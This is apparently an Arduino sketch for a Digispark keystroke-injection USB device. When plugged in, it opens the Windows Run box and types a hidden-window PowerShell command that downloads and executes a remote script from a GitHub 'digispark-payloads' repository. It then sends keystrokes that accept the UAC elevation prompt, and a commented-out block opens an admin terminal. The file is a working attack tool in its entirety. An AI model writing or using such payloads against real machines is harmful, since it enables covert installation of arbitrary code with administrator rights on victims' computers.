// #define LAYOUT_GERMAN
#include "DigiKeyboard.h"

void setup()
{
    pinMode(1, OUTPUT);
    DigiKeyboard.sendKeyStroke(0);

    /*
    // This opens the Terminal as admin
    DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
    DigiKeyboard.delay(50);
    DigiKeyboard.sendKeyStroke(KEY_A);
    DigiKeyboard.delay(250);
    DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
    */

    // open run box
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(250);

    // run command
    DigiKeyboard.print("powershell -W H -c \"& ([scriptblock]::Create((irm 'https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main/bootstrap.ps1'))) 1\"");

    // confirm UAC prompt
    DigiKeyboard.delay(50);
    DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
    DigiKeyboard.delay(450);
    DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
}

void loop()
{
    digitalWrite(1, HIGH);
    delay(500);
    digitalWrite(1, LOW);
    delay(500);
}